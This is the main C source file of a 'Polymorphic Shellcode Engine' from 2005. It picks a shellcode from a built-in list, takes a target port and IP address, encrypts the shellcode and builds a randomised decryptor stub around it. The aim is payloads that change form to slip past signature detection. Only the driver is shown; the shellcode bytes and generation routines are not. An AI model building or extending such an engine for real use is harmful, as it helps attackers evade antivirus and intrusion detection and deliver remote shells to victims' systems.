/*
** main.c for Polymorphic Shellcode Engine project
** 
** Made by eee
** 
** Started on  Tue Apr 12 15:54:13 2005 eee
** Last update Mon Apr 18 14:02:40 2005 eee
*/

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pse.h>

extern t_sh	gl_sh[];

void	build_poly(t_env *env)
{
  int	size;

  size = sizeof(char) * (DECRYPT_MAX_SIZE + 1);
  env->save = xmalloc(size);
  env->decrypt = env->save;
  bzero(env->decrypt, size);
  printf("\n[-] Generation : calcul delta offset :\n");
  build_delta(env);
  printf("\n[-] Generation : initialisation de la boucle :\n");
  build_init(env);
  printf("\n[-] Generation : boucle :\n");
  env->decrypt += strlen(env->decrypt);
  build_loop(env);
}

int	help()
{
  int	i;

  printf("\n./pse [shellcode number] [port] [ip]\n\n");
  printf("shellcode list : \n");
  for (i = 0; gl_sh[i].sh; i++)
    printf("%d - %s\n", gl_sh[i].nb, gl_sh[i].desc);
  printf("\n\n");
  exit(0);
}

void	check_arg(int ac, char **av, t_env *env)
{
  if (ac > 1)
    {
      if ((strcmp(av[1], "-h")) == 0)
	help();
      else if (atoi(av[1]) > -1 && atoi(av[1]) < MAX_SH)
	env->sh = atoi(av[1]);
      if (ac > 2)
	env->port = htons(atoi(av[2]));
      else
	env->port = htons(DEFAULT_PORT);
      if (ac > 3)
	env->ip = inet_addr(av[3]);
      else
	env->ip = inet_addr(DEFAULT_IP);
    }
}

int	main(int ac, char **av)
{
  t_env	env;

  printf("%s\n", BANNER);
  env.sh = 0;
  check_arg(ac, av, &env);
  srandom(time(0) * getpid());
  load_sh(&env, gl_sh[env.sh].sh);
  //write(1,env.shellcode, env.size);
  //exit(0);
  check_key(&env, gl_sh[env.sh].desc);
  crypt_sh(&env);
  build_poly(&env);
  write_shellcode(&env);
  return (0);
}
